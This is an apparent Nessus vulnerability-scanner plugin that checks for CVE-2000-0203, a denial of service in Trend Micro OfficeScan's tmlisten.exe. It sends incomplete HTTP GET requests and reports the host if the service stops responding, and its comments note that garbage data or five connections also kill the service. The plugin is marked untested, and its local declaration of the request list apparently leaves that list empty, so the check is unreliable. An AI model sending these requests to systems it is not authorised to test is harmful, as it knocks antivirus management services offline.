#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CVE
#
# Status: untested
#
# TBD:
# Sending garbage may also kill the service or make it eat 100% CPU
# Opening 5 connections while sending garbage will kill it



include("compat.inc");

if(description)
{
 script_id(11059);
 script_version("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0203");
 script_bugtraq_id(1013);
 script_xref(name:"OSVDB", value:"2082");

 script_name(english:"Trend Micro OfficeScan tmlisten.exe Malformed Data Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a 
denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the Trend Micro OfficeScan 
antivirus management service by sending an incomplete 
HTTP request." );
 script_set_attribute(attribute:"solution", value:
"upgrade your software" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english: "Crashes OfficeScan");
 script_category(ACT_DENIAL);
 script_copyright(english: "This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Windows");
 script_dependencies("find_service1.nasl");
 script_require_ports("Services/www", 12345);
 exit(0);
}

# The script code starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(port)
{
 local_var  attack, r, n, soc, attacks_l;

 if (http_is_dead(port: port)) return (0);

 n = 0;
 foreach attack (attacks_l)
 {
  soc = http_open_socket(port);
  if (! soc)
   sleep(1);
  else
  {
   send(socket:soc, data: attack);
   r = http_recv3(socket:soc);
   http_close_socket(soc);
   n++;
  }
 }
 if (! n) return 0;
 if (http_is_dead(port: port, retry: 3)) security_warning(port);
}

 # get or GET?
 attacks_l = make_list('get /  \r\n', 'GET /  \r\n');

ports = add_port_in_list(list:get_kb_list("Services/www"), port:12345);
foreach port (ports)
 check(port:port);

